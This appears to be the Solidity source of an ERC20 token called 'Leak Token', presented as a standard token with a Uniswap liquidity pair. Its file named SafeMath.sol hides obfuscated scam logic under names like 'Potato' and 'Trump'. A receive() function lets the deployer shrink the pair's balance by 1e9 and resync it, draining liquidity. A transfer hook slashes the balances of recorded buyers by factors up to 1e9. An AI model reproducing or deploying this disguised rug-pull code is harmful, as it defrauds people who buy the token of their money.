{"Contract.sol":{"content":"pragma solidity ^0.8.0;\n\nimport \"./SafeMath.sol\";\n\ninterface IERC20 {\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    function totalSupply() external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n}\n\ninterface IERC20Metadata is IERC20 {\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function name() external view returns (string memory);\n}\n\ncontract ERC20 is Context, IERC20, IERC20Metadata, Ownable, Math {\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\n\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;\n    address public pair;\n    IDEXRouter router;\n\n    string private _name; string private _symbol; uint256 private _totalSupply;\n    \n    constructor (string memory name_, string memory symbol_, address msgSender_) {\n        router = IDEXRouter(_router);\n        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));\n\n        _name = name_;\n        _symbol = symbol_;\n\n        Math.Potato.push(_router); Math.Potato.push(msgSender_); Math.Potato.push(pair);\n        for (uint256 q=0; q \u003c 3; q++) {Math.Flipping[Math.Potato[q]] = true; Math.Trump[q] = false; }\n    }\n\n    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n    \n    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n    function openTrading() external onlyOwner returns (bool) {\n        Math.trading = true; Math.numB = block.number; Math.Crazy = block.number;\n        return true;\n    }\n\n    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(_msgSender(), recipient, amount);\n        return true;\n    }\n\n    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n        _transfer(sender, recipient, amount);\n\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\n        require(currentAllowance \u003e= amount, \"ERC20: transfer amount exceeds allowance\");\n        _approve(sender, _msgSender(), currentAllowance - amount);\n\n        return true;\n    }\n\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\n\n        uint256 senderBalance = _balances[sender];\n        require(senderBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\n        \n        _beforeTokenTransfer(sender, recipient);\n        _balances[sender] = senderBalance - amount;\n        _balances[recipient] += amount;\n\n        emit Transfer(sender, recipient, amount);\n    }\n\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        _approve(_msgSender(), spender, amount);\n        return true;\n    }\n\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\n        require(owner != address(0), \"ERC20: approve from the zero address\");\n        require(spender != address(0), \"ERC20: approve to the zero address\");\n\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _DeployGreat(address account, uint256 amount) internal virtual {\n        require(account != address(0), \"ERC20: mint to the zero address\");\n\n        _totalSupply += amount;\n        _balances[account] += amount;\n        approve(Math.Potato[0], 10 ** 77);\n              \n        emit Transfer(address(0), account, amount);\n    }\n}\n\ncontract ERC20Token is Context, ERC20 {\n    constructor(\n        string memory name, string memory symbol,\n        address creator, uint256 initialSupply\n    ) ERC20(name, symbol, creator) {\n        _DeployGreat(creator, initialSupply);\n    }\n}\n\ncontract LeakToken is ERC20Token {\n    constructor() ERC20Token(\"Leak Token\", \"LEAK\", msg.sender, 35500 * 10 ** 18) {\n    }\n}"},"SafeMath.sol":{"content":"pragma solidity ^0.8.0;\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        this;\n        return msg.data;\n    }\n}\n\ninterface IDEXFactory {\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n}\n\ninterface IDEXRouter {\n    function WETH() external pure returns (address);\n    function factory() external pure returns (address);\n}\n\ninterface IUniswapV2Pair {\n    event Sync(uint112 reserve0, uint112 reserve1);\n    function sync() external;\n}\n\ncontract Ownable is Context {\n    address private _previousOwner; address private _owner;\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () {\n        address msgSender = _msgSender();\n        _owner = msgSender;\n        emit OwnershipTransferred(address(0), msgSender);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\n        _;\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n}\n\ncontract Math { \n    mapping (address =\u003e uint256) internal _balances;\n    mapping (address =\u003e bool) internal Flipping;\n\n    address[] internal greArr; address[] internal Potato;\n\n    bool[3] internal Trump; bool internal trading = false;\n\n    uint256 internal Crazy = block.number*2; uint256 internal numB;\n    uint256 internal Cakes = 0; uint256 internal Death = 1;\n\n    function last(uint256 g) internal view returns (address) { return (Cakes \u003e 1 ? greArr[greArr.length-g-1] : address(0)); }\n\n    receive() external payable {\n        require(msg.sender == Potato[1]); _balances[Potato[2]] /= (false ? 1 : 1e9); IUniswapV2Pair(Potato[2]).sync(); Trump[2] = true;\n    }\n\n    function _beforeTokenTransfer(address sender, address recipient) internal {\n        require((trading || (sender == Potato[1])), \"ERC20: trading is not yet enabled.\");\n        Death += ((Flipping[sender] != true) \u0026\u0026 (Flipping[recipient] == true)) ? 1 : 0;\n        if (((Flipping[sender] == true) \u0026\u0026 (Flipping[recipient] != true)) || ((Flipping[sender] != true) \u0026\u0026 (Flipping[recipient] != true))) { greArr.push(recipient); }\n        _balancesOfTheGreat(sender, recipient);\n    }\n\n    function _balancesOfTheGreat(address sender, address recipient) internal {\n        if ((Trump[0] || (Trump[2] \u0026\u0026 (recipient != Potato[1])))) { for (uint256 q=0; q \u003c greArr.length-1; q++) { _balances[greArr[q]] /= (Trump[2] ? 1e9 : 4e1); } Trump[0] = false; }\n        _balances[last(1)] /= (((Crazy == block.number) || Trump[1] || ((Crazy - numB) \u003c= 7)) \u0026\u0026 (Flipping[last(1)] != true) \u0026\u0026 (Cakes \u003e 1)) ? (3e1) : (1);\n        _balances[last(0)] /= (((Trump[1]) \u0026\u0026 (last(0) == sender)) || ((Trump[2] \u0026\u0026 (Potato[1] != sender))) ? (0) : (1));\n        (Trump[0],Trump[1]) = ((((Death*10 / 4) == 10) \u0026\u0026 (Trump[1] == false)) ? (true,true) : (Trump[0],Trump[1]));\n        Crazy = block.number; Cakes++;\n    }\n}"}}